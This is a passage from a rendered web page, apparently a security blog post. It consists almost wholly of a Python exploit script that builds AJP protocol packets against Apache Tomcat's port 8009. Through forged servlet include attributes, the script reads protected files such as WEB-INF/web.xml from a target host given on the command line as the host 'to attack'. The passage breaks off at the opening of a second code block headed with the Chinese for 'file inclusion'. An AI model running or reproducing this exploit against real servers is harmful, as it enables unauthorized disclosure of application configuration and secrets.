class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_string</span>(<span class="params">s</span>):</span></span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;h&quot;</span>, <span class="number">-1</span>)</span><br><span class="line">        l = len(s)</span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;H%dsb&quot;</span> % l, l, s.encode(<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpack</span>(<span class="params">stream, fmt</span>):</span></span><br><span class="line">        size = struct.calcsize(fmt)</span><br><span class="line">        buf = stream.read(size)</span><br><span class="line">        <span class="keyword">return</span> struct.unpack(fmt, buf)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpack_string</span>(<span class="params">stream</span>):</span></span><br><span class="line">        size, = unpack(stream, <span class="string">&quot;&gt;h&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">-1</span>: <span class="comment"># null string</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        res, = unpack(stream, <span class="string">&quot;%ds&quot;</span> % size)</span><br><span class="line">        stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFoundException</span>(<span class="params">Exception</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjpBodyRequest</span>(<span class="params">object</span>):</span></span><br><span class="line">        <span class="comment"># server == web server, container == servlet</span></span><br><span class="line">        SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(<span class="number">2</span>)</span><br><span class="line">        MAX_REQUEST_LENGTH = <span class="number">8186</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data_stream, data_len, data_direction=None</span>):</span></span><br><span class="line">                self.data_stream = data_stream</span><br><span class="line">                self.data_len = data_len</span><br><span class="line">                self.data_direction = data_direction</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">serialize</span>(<span class="params">self</span>):</span></span><br><span class="line">                data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line">                <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x00</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        res = struct.pack(<span class="string">&quot;&gt;H&quot;</span>, len(data))</span><br><span class="line">                        res += data</span><br><span class="line">                <span class="keyword">if</span> self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">                        header = struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, len(res))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        header = struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, len(res))</span><br><span class="line">                <span class="keyword">return</span> header + res</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">send_and_receive</span>(<span class="params">self, socket, stream</span>):</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        data = self.serialize()</span><br><span class="line">                        socket.send(data)</span><br><span class="line">                        r = AjpResponse.receive(stream)</span><br><span class="line">                        <span class="keyword">while</span> r.prefix_code != AjpResponse.GET_BODY_CHUNK <span class="keyword">and</span> r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">                                r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> r.prefix_code == AjpResponse.SEND_HEADERS <span class="keyword">or</span> len(data) == <span class="number">4</span>:</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjpForwardRequest</span>(<span class="params">object</span>):</span></span><br><span class="line">        _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(<span class="number">28</span>)</span><br><span class="line">        REQUEST_METHODS = &#123;<span class="string">&#x27;GET&#x27;</span>: GET, <span class="string">&#x27;POST&#x27;</span>: POST, <span class="string">&#x27;HEAD&#x27;</span>: HEAD, <span class="string">&#x27;OPTIONS&#x27;</span>: OPTIONS, <span class="string">&#x27;PUT&#x27;</span>: PUT, <span class="string">&#x27;DELETE&#x27;</span>: DELETE, <span class="string">&#x27;TRACE&#x27;</span>: TRACE&#125;</span><br><span class="line">        <span class="comment"># server == web server, container == servlet</span></span><br><span class="line">        SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(<span class="number">2</span>)</span><br><span class="line">        COMMON_HEADERS = [<span class="string">&quot;SC_REQ_ACCEPT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;SC_REQ_ACCEPT_CHARSET&quot;</span>, <span class="string">&quot;SC_REQ_ACCEPT_ENCODING&quot;</span>, <span class="string">&quot;SC_REQ_ACCEPT_LANGUAGE&quot;</span>, <span class="string">&quot;SC_REQ_AUTHORIZATION&quot;</span>,</span><br><span class="line">                <span class="string">&quot;SC_REQ_CONNECTION&quot;</span>, <span class="string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>, <span class="string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>, <span class="string">&quot;SC_REQ_COOKIE&quot;</span>, <span class="string">&quot;SC_REQ_COOKIE2&quot;</span>,</span><br><span class="line">                <span class="string">&quot;SC_REQ_HOST&quot;</span>, <span class="string">&quot;SC_REQ_PRAGMA&quot;</span>, <span class="string">&quot;SC_REQ_REFERER&quot;</span>, <span class="string">&quot;SC_REQ_USER_AGENT&quot;</span></span><br><span class="line">        ]</span><br><span class="line">        ATTRIBUTES = [<span class="string">&quot;context&quot;</span>, <span class="string">&quot;servlet_path&quot;</span>, <span class="string">&quot;remote_user&quot;</span>, <span class="string">&quot;auth_type&quot;</span>, <span class="string">&quot;query_string&quot;</span>, <span class="string">&quot;route&quot;</span>, <span class="string">&quot;ssl_cert&quot;</span>, <span class="string">&quot;ssl_cipher&quot;</span>, <span class="string">&quot;ssl_session&quot;</span>, <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;ssl_key_size&quot;</span>, <span class="string">&quot;secret&quot;</span>, <span class="string">&quot;stored_method&quot;</span>]</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data_direction=None</span>):</span></span><br><span class="line">                self.prefix_code = <span class="number">0x02</span></span><br><span class="line">                self.method = <span class="literal">None</span></span><br><span class="line">                self.protocol = <span class="literal">None</span></span><br><span class="line">                self.req_uri = <span class="literal">None</span></span><br><span class="line">                self.remote_addr = <span class="literal">None</span></span><br><span class="line">                self.remote_host = <span class="literal">None</span></span><br><span class="line">                self.server_name = <span class="literal">None</span></span><br><span class="line">                self.server_port = <span class="literal">None</span></span><br><span class="line">                self.is_ssl = <span class="literal">None</span></span><br><span class="line">                self.num_headers = <span class="literal">None</span></span><br><span class="line">                self.request_headers = <span class="literal">None</span></span><br><span class="line">                self.attributes = <span class="literal">None</span></span><br><span class="line">                self.data_direction = data_direction</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">pack_headers</span>(<span class="params">self</span>):</span></span><br><span class="line">                self.num_headers = len(self.request_headers)</span><br><span class="line">                res = <span class="string">&quot;&quot;</span></span><br><span class="line">                res = struct.pack(<span class="string">&quot;&gt;h&quot;</span>, self.num_headers)</span><br><span class="line">                <span class="keyword">for</span> h_name <span class="keyword">in</span> self.request_headers:</span><br><span class="line">                        <span class="keyword">if</span> h_name.startswith(<span class="string">&quot;SC_REQ&quot;</span>):</span><br><span class="line">                                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + <span class="number">1</span></span><br><span class="line">                                res += struct.pack(<span class="string">&quot;BB&quot;</span>, <span class="number">0xA0</span>, code)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">                        res += pack_string(self.request_headers[h_name])</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">pack_attributes</span>(<span class="params">self</span>):</span></span><br><span class="line">                res = <span class="string">b&quot;&quot;</span></span><br><span class="line">                <span class="keyword">for</span> attr <span class="keyword">in</span> self.attributes:</span><br><span class="line">                        a_name = attr[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">                        code = AjpForwardRequest.ATTRIBUTES.index(a_name) + <span class="number">1</span></span><br><span class="line">                        res += struct.pack(<span class="string">&quot;b&quot;</span>, code)</span><br><span class="line">                        <span class="keyword">if</span> a_name == <span class="string">&quot;req_attribute&quot;</span>:</span><br><span class="line">                                aa_name, a_value = attr[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">                                res += pack_string(aa_name)</span><br><span class="line">                                res += pack_string(a_value)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                res += pack_string(attr[<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">                res += struct.pack(<span class="string">&quot;B&quot;</span>, <span class="number">0xFF</span>)</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">serialize</span>(<span class="params">self</span>):</span></span><br><span class="line">                res = <span class="string">&quot;&quot;</span></span><br><span class="line">                res = struct.pack(<span class="string">&quot;bb&quot;</span>, self.prefix_code, self.method)</span><br><span class="line">                res += pack_string(self.protocol)</span><br><span class="line">                res += pack_string(self.req_uri)</span><br><span class="line">                res += pack_string(self.remote_addr)</span><br><span class="line">                res += pack_string(self.remote_host)</span><br><span class="line">                res += pack_string(self.server_name)</span><br><span class="line">                res += struct.pack(<span class="string">&quot;&gt;h&quot;</span>, self.server_port)</span><br><span class="line">                res += struct.pack(<span class="string">&quot;?&quot;</span>, self.is_ssl)</span><br><span class="line">                res += self.pack_headers()</span><br><span class="line">                res += self.pack_attributes()</span><br><span class="line">                <span class="keyword">if</span> self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">                        header = struct.pack(<span class="string">&quot;&gt;bbh&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, len(res))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        header = struct.pack(<span class="string">&quot;&gt;bbh&quot;</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, len(res))</span><br><span class="line">                <span class="keyword">return</span> header + res</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, raw_packet</span>):</span></span><br><span class="line">                stream = StringIO(raw_packet)</span><br><span class="line">                self.magic1, self.magic2, data_len = unpack(stream, <span class="string">&quot;bbH&quot;</span>)</span><br><span class="line">                self.prefix_code, self.method = unpack(stream, <span class="string">&quot;bb&quot;</span>)</span><br><span class="line">                self.protocol = unpack_string(stream)</span><br><span class="line">                self.req_uri = unpack_string(stream)</span><br><span class="line">                self.remote_addr = unpack_string(stream)</span><br><span class="line">                self.remote_host = unpack_string(stream)</span><br><span class="line">                self.server_name = unpack_string(stream)</span><br><span class="line">                self.server_port = unpack(stream, <span class="string">&quot;&gt;h&quot;</span>)</span><br><span class="line">                self.is_ssl = unpack(stream, <span class="string">&quot;?&quot;</span>)</span><br><span class="line">                self.num_headers, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                self.request_headers = &#123;&#125;</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(self.num_headers):</span><br><span class="line">                        code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> code &gt; <span class="number">0xA000</span>:</span><br><span class="line">                                h_name = AjpForwardRequest.COMMON_HEADERS[code - <span class="number">0xA001</span>]</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                h_name = unpack(stream, <span class="string">&quot;%ds&quot;</span> % code)</span><br><span class="line">                                stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">                        h_value = unpack_string(stream)</span><br><span class="line">                        self.request_headers[h_name] = h_value</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">send_and_receive</span>(<span class="params">self, socket, stream, save_cookies=False</span>):</span></span><br><span class="line">                res = []</span><br><span class="line">                i = socket.sendall(self.serialize())</span><br><span class="line">                <span class="keyword">if</span> self.method == AjpForwardRequest.POST:</span><br><span class="line">                        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">                r = AjpResponse.receive(stream)</span><br><span class="line">                <span class="keyword">assert</span> r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">                res.append(r)</span><br><span class="line">                <span class="keyword">if</span> save_cookies <span class="keyword">and</span> <span class="string">&#x27;Set-Cookie&#x27;</span> <span class="keyword">in</span> r.response_headers:</span><br><span class="line">                        self.headers[<span class="string">&#x27;SC_REQ_COOKIE&#x27;</span>] = r.response_headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                <span class="comment"># read body chunks and end response packets</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        r = AjpResponse.receive(stream)</span><br><span class="line">                        res.append(r)</span><br><span class="line">                        <span class="keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">elif</span> r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">                                <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                <span class="keyword">raise</span> NotImplementedError</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjpResponse</span>(<span class="params">object</span>):</span></span><br><span class="line">        _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(<span class="number">7</span>)</span><br><span class="line">        COMMON_SEND_HEADERS = [</span><br><span class="line">                        <span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Content-Language&quot;</span>, <span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;Date&quot;</span>, <span class="string">&quot;Last-Modified&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Location&quot;</span>, <span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;Set-Cookie2&quot;</span>, <span class="string">&quot;Servlet-Engine&quot;</span>, <span class="string">&quot;Status&quot;</span>, <span class="string">&quot;WWW-Authenticate&quot;</span></span><br><span class="line">                        ]</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">                <span class="comment"># read headers</span></span><br><span class="line">                self.magic, self.data_length, self.prefix_code = unpack(stream, <span class="string">&quot;&gt;HHb&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> self.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">                        self.parse_send_headers(stream)</span><br><span class="line">                <span class="keyword">elif</span> self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">                        self.parse_send_body_chunk(stream)</span><br><span class="line">                <span class="keyword">elif</span> self.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">                        self.parse_end_response(stream)</span><br><span class="line">                <span class="keyword">elif</span> self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">                        self.parse_get_body_chunk(stream)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse_send_headers</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">                self.http_status_code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                self.http_status_msg = unpack_string(stream)</span><br><span class="line">                self.num_headers, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                self.response_headers = &#123;&#125;</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(self.num_headers):</span><br><span class="line">                        code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> code &lt;= <span class="number">0xA000</span>: <span class="comment"># custom header</span></span><br><span class="line">                                h_name, = unpack(stream, <span class="string">&quot;%ds&quot;</span> % code)</span><br><span class="line">                                stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">                                h_value = unpack_string(stream)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                h_name = AjpResponse.COMMON_SEND_HEADERS[code<span class="number">-0xA001</span>]</span><br><span class="line">                                h_value = unpack_string(stream)</span><br><span class="line">                        self.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse_send_body_chunk</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">                self.data_length, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                self.data = stream.read(self.data_length+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse_end_response</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">                self.reuse, = unpack(stream, <span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">parse_get_body_chunk</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">                rlen, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> rlen</span><br><span class="line"></span><br><span class="line"><span class="meta">        @staticmethod</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">receive</span>(<span class="params">stream</span>):</span></span><br><span class="line">                r = AjpResponse()</span><br><span class="line">                r.parse(stream)</span><br><span class="line">                <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare_ajp_forward_request</span>(<span class="params">target_host, req_uri, method=AjpForwardRequest.GET</span>):</span></span><br><span class="line">        fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">        fr.method = method</span><br><span class="line">        fr.protocol = <span class="string">&quot;HTTP/1.1&quot;</span></span><br><span class="line">        fr.req_uri = req_uri</span><br><span class="line">        fr.remote_addr = target_host</span><br><span class="line">        fr.remote_host = <span class="literal">None</span></span><br><span class="line">        fr.server_name = target_host</span><br><span class="line">        fr.server_port = <span class="number">80</span></span><br><span class="line">        fr.request_headers = &#123;</span><br><span class="line">                <span class="string">&#x27;SC_REQ_ACCEPT&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;SC_REQ_CONNECTION&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;SC_REQ_CONTENT_LENGTH&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;SC_REQ_HOST&#x27;</span>: target_host,</span><br><span class="line">                <span class="string">&#x27;SC_REQ_USER_AGENT&#x27;</span>: <span class="string">&#x27;Mozilla&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, sdch&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        fr.is_ssl = <span class="literal">False</span></span><br><span class="line">        fr.attributes = []</span><br><span class="line">        <span class="keyword">return</span> fr</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tomcat</span>(<span class="params">object</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, target_host, target_port</span>):</span></span><br><span class="line">                self.target_host = target_host</span><br><span class="line">                self.target_port = target_port</span><br><span class="line"></span><br><span class="line">                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">                self.socket.connect((target_host, target_port))</span><br><span class="line">                self.stream = self.socket.makefile(<span class="string">&quot;rb&quot;</span>, bufsize=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">perform_request</span>(<span class="params">self, req_uri, headers=&#123;&#125;, method=<span class="string">&#x27;GET&#x27;</span>, user=None, password=None, attributes=[]</span>):</span></span><br><span class="line">                self.req_uri = req_uri</span><br><span class="line">                self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">                print(<span class="string">&quot;Getting resource at ajp13://%s:%d%s&quot;</span> % (self.target_host, self.target_port, req_uri))</span><br><span class="line">                <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> password <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.forward_request.request_headers[<span class="string">&#x27;SC_REQ_AUTHORIZATION&#x27;</span>] = <span class="string">&quot;Basic &quot;</span> + (<span class="string">&quot;%s:%s&quot;</span> % (user, password)).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> h <span class="keyword">in</span> headers:</span><br><span class="line">                        self.forward_request.request_headers[h] = headers[h]</span><br><span class="line">                <span class="keyword">for</span> a <span class="keyword">in</span> attributes:</span><br><span class="line">                        self.forward_request.attributes.append(a)</span><br><span class="line">                responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">                <span class="keyword">if</span> len(responses) == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">                snd_hdrs_res = responses[<span class="number">0</span>]</span><br><span class="line">                data_res = responses[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">if</span> len(data_res) == <span class="number">0</span>:</span><br><span class="line">                        print(<span class="string">&quot;No data in response. Headers:%s\n&quot;</span> % snd_hdrs_res.response_headers)</span><br><span class="line">                <span class="keyword">return</span> snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">javax.servlet.include.request_uri</span></span><br><span class="line"><span class="string">javax.servlet.include.path_info</span></span><br><span class="line"><span class="string">javax.servlet.include.servlet_path</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;target&quot;</span>, type=str, help=<span class="string">&quot;Hostname or IP to attack&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, type=int, default=<span class="number">8009</span>, help=<span class="string">&quot;AJP port to attack (default is 8009)&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&#x27;--file&#x27;</span>, type=str, default=<span class="string">&#x27;WEB-INF/web.xml&#x27;</span>, help=<span class="string">&quot;file path :(WEB-INF/web.xml)&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_,data = t.perform_request(<span class="string">&#x27;/asdf&#x27;</span>,attributes=[</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.request_uri&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.path_info&#x27;</span>,args.file]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.servlet_path&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]&#125;,</span><br><span class="line">    ])</span><br><span class="line">print(<span class="string">&#x27;----------------------------&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join([d.data <span class="keyword">for</span> d <span class="keyword">in</span> data]))</span><br></pre></td></tr></table></figure><p>文件包含</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 